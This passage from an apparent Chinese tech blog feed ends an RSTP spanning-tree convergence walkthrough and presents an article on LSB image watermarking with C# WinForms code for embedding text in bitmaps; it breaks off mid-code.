src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图21.png" alt="图21"></center><center>图21</center><p>​        由于BID=3网桥端口1是根端口，且各个端口状态为丢弃状态，BID=3网桥通过端口1发送<strong>Agreement BPDU</strong>。BID=2网桥端口4接收到Agreement BPDU后，端口状态仍为<strong>转发状态</strong>（如图22所示）并向BID=3端口1发送一个<strong>Agreement BPDU</strong>。当BID=3端口1接收到该Agreement BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图23所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图22.png" alt="图22"></center><center>图22</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图23.png" alt="图23"></center><center>图23</center><p><strong>BID=4网桥</strong>：</p><p>​        当BID=4网桥通过端口1接收到<strong>BPDU=&lt;1,19,2,2&gt;</strong>,通过端口2接收到<strong>BPDU=&lt;1,19,2,3&gt;</strong>，通过端口3接收到<strong>BPDU=&lt;3,0,3,3&gt;</strong>时，确根端口1为<strong>根端口</strong>，端口3角色<strong>转变为根端口</strong>，端口状态仍为<strong>丢弃状态</strong>（如图24所示），由此得到BID=4网桥的根路径开销为38，以此推到出BID=4网桥其他端口的端口BPDU如图25所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图24.png" alt="图24"></center><center>图24</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图25.png" alt="图25"></center><center>图25</center><p>​        由于BID=4网桥端口1是根端口，且各个端口状态均为丢弃状态，BID=4网桥通过端口1发送Agreement BPDU。BID=2网桥端口2接收到Agreement BPDU后，端口状态仍为<strong>转发状态</strong>，如图26所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图26.png" alt="图26"></center><center>图26</center><p>​        每当间隔时间定时器溢出时，BID=2网桥端口2发送置位标志位Forwarding置位的BPDU。BID=4网桥端口1接收到该BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图27所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图27.png" alt="图27"></center><center>图27</center><p>​        BID=4网桥通过端口2向BID=2发送Proposal BPDU，通过端口3向BID=3发送Proposal（如图28所示）。当BID=2端口3接收到Proposal BPDU后，判断本端口BPDU更优，端口角色保持不变，端口状态仍为转发状态（如图29所示）。当BID=3端口3接收到Proposal BPDU后，判断本端口BPDU更优，端口角色保持不变，端口状态转变为转发状态（如图29所示）。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图28.png" alt="图28"></center><center>图28</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图29.png" alt="图29"></center><center>图29</center><p>​        当BID=4端口2接收到Proposal BPDU后，由于该BPDU优于端口BPDU=&lt;1,38,4,2&gt;，端口角色转变为替换角色，端口状态仍为丢弃状态（如图30所示）。当BID=4端口3接收到Proposal BPDU后，由于该BPDU优于端口BPDU=&lt;1,38,4,3&gt;，端口角色转变为替换角色，端口状态转变仍为丢弃状态（如图30所示）。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图30.png" alt="图30"></center><center>图30</center><p>​        完成上述过程后，重新构建的生成树即完成（如图31所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图31.png" alt="图31"></center><center>图31</center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考资料</strong>：</p><p>《路由和交换技术(第2版)》</p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
            <tag> RSTP </tag>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSB算法分析与实现</title>
      <link href="/2020/08/27/lsb-suan-fa-fen-xi-yu-shi-xian/"/>
      <url>/2020/08/27/lsb-suan-fa-fen-xi-yu-shi-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="数字水印"><a href="#数字水印" class="headerlink" title="数字水印"></a>数字水印</h1><p>​        数字水印（Digital Watermark）是一种应用<strong>计算机算法</strong>嵌入载体文件的<strong>保护信息</strong>，数字水印技术是一种基于内容的、非密码机制的计算机信息隐藏技术，它是将一些标识信息（即数字水印）<strong>直接嵌入数字载体</strong>当中（包括多媒体、文档、软件等）或是<strong>间接表示</strong>（修改特定区域的结构），且不影响原载体的使用价值，也不容易被探知和再次修改，但可以被生产方识别和辨认。</p><p>​        常用的数字水印有很多种，LSB是其中一种简单的隐写算法。</p><h1 id="LSB简介"><a href="#LSB简介" class="headerlink" title="LSB简介"></a>LSB简介</h1><p>​        LSB全称为 Least Significant Bit（最低有效位），是一种常被用做图片隐写的算法（在CTF中经常见到她的身影）。LSB属于空域算法中的一种，是将信息嵌入到图像点中像素位的最低位，以保证嵌入的信息是不可见的，但是由于使用了图像不重要的像素位，算法的鲁棒性差，水印信息很容易为滤波、图像量化、几何变形的操作破坏。</p><h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><p>​        PNG和BMP图片中的图像像素一般是有由RGB三原色组成（如图1所示），每一种颜色占用8位，取值范围为0x00~0xFF，既有$2^{24}$种色值。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类眼睛无法区分的颜色还有600多万。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/RGB.png" alt="RGB"></center><center>图1</center><p>当仅仅更改颜色分量的最低位时，人类的眼睛不能区分这前后的变化，LSB就是在该位置存放信息。如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/LSB.png" alt="LSB"></center><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>将图像文件中的所有像素点以<strong>RGB</strong>形式分隔开，并将各个<strong>颜色分量</strong>转换成<strong>二进制</strong>表示</li><li>把每个颜色分量值的<strong>最后一位全部设置成0</strong>，对图像得影响非常细微，不会影响图像的显示格式</li><li>信息嵌入：将水印字符转化为二进制字符串，并将这些信息<strong>依次填入颜色分量的最低位上</strong>，即可完成信息的嵌入</li><li>信息提取：将图像像素的<strong>最低位依次提取</strong>出来，并进行拼接，即可得到原始信息</li></ol><h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><p><strong>嵌入信息框图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/LSB-Embed.png" alt="LSB-Embed"></center><p><strong>提取信息框图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/LSB-Extract.png" alt="LSB-Extract"></center><p><strong>文档结构</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/文档结构.png" alt="文档结构"></center><p><strong>程序主界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/主界面.png" alt="主界面"></center><p><strong>主界面代码</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">MainFrm</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        Form frm<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">MainFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 嵌入按钮得Click事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnEnbed_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            frm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InfoEmbedmentFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>frm<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>Cancel<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                Application<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取按钮的Click事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnExtract_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            frm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InfoExtractionFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>frm<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>Cancel<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                Application<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>嵌入界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/嵌入界面.png" alt="嵌入界面"></center><p><strong>嵌入界面代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Drawing<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">InfoEmbedmentFrm</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> fileName<span class="token punctuation">;</span>        <span class="token keyword">private</span> LSBHelper lsb<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> MemoryStream memStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">InfoEmbedmentFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 初始化界面</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 设置显示界面</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 设置显示界面</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="flag">0:初始化、下载之后;1:图片加载之后;2:图片嵌入之后</span>        <span class="token comment" spellcheck="true">/// &lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token keyword">int</span> flag<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//初始化、下载之后</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置界面显示的起始位置</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>StartPosition <span class="token operator">=</span> FormStartPosition<span class="token punctuation">.</span>CenterScreen<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// PictureBox控件</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 两个必须都要设置（因两次的加载途径不一样）</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                pBoxDisplay<span class="token punctuation">.</span>Image <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Button控件</span>                btnDownloadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btnEmbedInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//图片加载之后</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Button控件</span>                btnDownloadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btnEmbedInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//图片嵌入之后</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Button控件</span>                btnDownloadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnEmbedInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnDownloadImage<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 加载图片的事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnLoadImage_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 再次单击加载图片按钮时，回到初始化状态</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置打开对话框的标题</span>            openImageDialog<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"请选择一张位图"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 对文件格式进行筛选</span>            openImageDialog<span class="token punctuation">.</span>Filter <span class="token operator">=</span> <span class="token string">"bmp | *.bmp;*.BMP"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 默认设置为空</span>            openImageDialog<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>openImageDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 存储打开文件的全文件名</span>                fileName <span class="token operator">=</span> openImageDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置显示图片的样式</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 加载要显示的图片</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> fileName<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置显示界面</span>                <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 嵌入文本的事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnEmbedInfo_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 已经在界面设置中代替</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">IsNullOrWhiteSpace</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请选择一张位图"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">IsNullOrWhiteSpace</span><span class="token punctuation">(</span>rtbInfo<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请输入要嵌入的文本信息"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                lsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LSBHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">.</span><span class="token function">EmbedInfo</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> rtbInfo<span class="token punctuation">.</span>Text<span class="token punctuation">,</span> <span class="token keyword">out</span> msg<span class="token punctuation">,</span> <span class="token keyword">out</span> memStream<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//pBoxDisplay.ImageLocation = "C:\\Users\\ss\\Desktop\\664204.bmp";</span>                    pBoxDisplay<span class="token punctuation">.</span>Image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token function">FromStream</span><span class="token punctuation">(</span>memStream<span class="token punctuation">)</span><span class="token punctuation">;</span>                    MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 设置显示界面</span>                    <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Error<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 下载图片按钮触发的事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnDownloadImage_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>memStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                saveImageDialog<span class="token punctuation">.</span>Filter <span class="token operator">=</span> <span class="token string">"位图（*.bmp）|*.bmp"</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>saveImageDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    FileStream fs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    BinaryWriter bw <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span>                    <span class="token punctuation">{</span>                        fs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileStream</span><span class="token punctuation">(</span>saveImageDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">,</span> FileMode<span class="token punctuation">.</span>Create<span class="token punctuation">,</span> FileAccess<span class="token punctuation">.</span>Write<span class="token punctuation">)</span><span class="token punctuation">;</span>                        bw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BinaryWriter</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 指针回位（每次操作之前都要先操作一下）</span>                        memStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                        <span class="token keyword">while</span> <span class="token punctuation">(</span>memStream<span class="token punctuation">.</span>Position <span class="token operator">!=</span> memStream<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// ReadByte()强制转换成Int32类型</span>                            <span class="token keyword">byte</span> write <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memStream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            bw<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"图片下载成功"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//设置显示界面</span>                        <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span>Message<span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">finally</span>                    <span class="token punctuation">{</span>                        fs<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        bw<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>提取界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/提取界面.png" alt="提取界面"></center><p><strong>提取界面代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">InfoExtractionFrm</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 